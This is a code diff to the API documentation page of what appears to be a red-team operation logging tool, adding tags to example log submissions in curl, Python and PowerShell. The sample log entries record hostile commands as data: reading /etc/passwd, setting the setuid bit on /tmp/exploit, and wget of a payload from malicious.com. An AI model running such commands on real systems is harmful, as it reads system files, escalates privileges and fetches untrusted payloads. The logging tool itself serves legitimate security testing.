@@ -124,7 +124,8 @@ const ApiDocumentation = () => {
   "command": "cat /etc/passwd",
   "notes": "Privilege escalation attempt",
   "filename": "passwd",
-  "status": "ON_DISK"
+  "status": "ON_DISK",
+  "tags": ["OP1", "privilege-escalation", "linux"]
 }`}</pre>
                     </div>
                     
@@ -197,7 +198,7 @@ const ApiDocumentation = () => {
                   <div className="bg-gray-900 p-3 rounded-md">
                     <div className="flex justify-between items-center mb-2">
                       <span className="text-blue-300 font-medium">Submitting a log</span>
-                      <button 
+                      <button
                         onClick={() => copyToClipboard(`curl -k -X POST https://your-IP-or-Host:3000/ingest/logs \\
   -H "Content-Type: application/json" \\
   -H "X-API-Key: rtl_yourkey_abc123" \\
@@ -210,7 +211,8 @@ const ApiDocumentation = () => {
     "command": "cat /etc/passwd",
     "notes": "Privilege escalation attempt",
     "filename": "passwd",
-    "status": "ON_DISK"
+    "status": "ON_DISK",
+    "tags": ["OP1", "privilege-escalation", "linux"]
   }'`)}
                         className="text-gray-400 hover:text-white p-1 rounded"
                         title="Copy to clipboard"
@@ -230,7 +232,8 @@ const ApiDocumentation = () => {
     "command": "cat /etc/passwd",
     "notes": "Privilege escalation attempt",
     "filename": "passwd",
-    "status": "ON_DISK"
+    "status": "ON_DISK",
+    "tags": ["OP1", "privilege-escalation", "linux"]
   }'`}</pre>
                   </div>
                 </div>
@@ -268,7 +271,8 @@ log_data = {
     "internal_ip": "192.168.1.100",
     "hostname": "victim-host",
     "command": "cat /etc/passwd",
-    "status": "ON_DISK"
+    "status": "ON_DISK",
+    "tags": ["OP1", "privilege-escalation"]
 }
 
 result = send_log(api_key, log_data)
@@ -302,7 +306,8 @@ log_data = {
     "internal_ip": "192.168.1.100",
     "hostname": "victim-host",
     "command": "cat /etc/passwd",
-    "status": "ON_DISK"
+    "status": "ON_DISK",
+    "tags": ["OP1", "privilege-escalation"]
 }
 
 result = send_log(api_key, log_data)
@@ -338,6 +343,7 @@ $payload = @{
     notes = "Privilege escalation attempt"
     filename = "passwd"
     status = "ON_DISK"
+    tags = @("OP1", "privilege-escalation", "windows")
 } | ConvertTo-Json
 
 $response = Invoke-RestMethod -Uri $url -Method Post -Headers $headers -Body $payload -ContentType "application/json"
@@ -366,6 +372,7 @@ $payload = @{
     notes = "Privilege escalation attempt"
     filename = "passwd"
     status = "ON_DISK"
+    tags = @("OP1", "privilege-escalation", "windows")
 } | ConvertTo-Json
 
 $response = Invoke-RestMethod -Uri $url -Method Post -Headers $headers -Body $payload -ContentType "application/json"
@@ -382,7 +389,7 @@ $response | ConvertTo-Json`}</pre>
                   <div className="bg-gray-900 p-3 rounded-md">
                     <div className="flex justify-between items-center mb-2">
                       <span className="text-blue-300 font-medium">cURL Batch Example</span>
-                      <button 
+                      <button
                         onClick={() => copyToClipboard(`curl -k -X POST https://your-IP-or-Host:3000/ingest/logs \\
   -H "Content-Type: application/json" \\
   -H "X-API-Key: rtl_yourkey_abc123" \\
@@ -390,13 +397,15 @@ $response | ConvertTo-Json`}</pre>
     {
       "internal_ip": "192.168.1.100",
       "hostname": "host-1",
-      "command": "chmod +s /tmp/exploit"
+      "command": "chmod +s /tmp/exploit",
+      "tags": ["OP1", "privilege-escalation"]
     },
     {
       "external_ip": "198.51.100.1",
       "hostname": "host-2",
       "domain": "example.org",
-      "command": "wget http://malicious.com/payload"
+      "command": "wget http://malicious.com/payload",
+      "tags": ["OP2", "payload-delivery"]
     }
   ]'`)}
                         className="text-gray-400 hover:text-white p-1 rounded"
@@ -412,13 +421,15 @@ $response | ConvertTo-Json`}</pre>
     {
       "internal_ip": "192.168.1.100",
       "hostname": "host-1",
-      "command": "chmod +s /tmp/exploit"
+      "command": "chmod +s /tmp/exploit",
+      "tags": ["OP1", "privilege-escalation"]
     },
     {
       "external_ip": "198.51.100.1",
       "hostname": "host-2",
       "domain": "example.org",
-      "command": "wget http://malicious.com/payload"
+      "command": "wget http://malicious.com/payload",
+      "tags": ["OP2", "payload-delivery"]
     }
   ]'`}</pre>
                   </div>
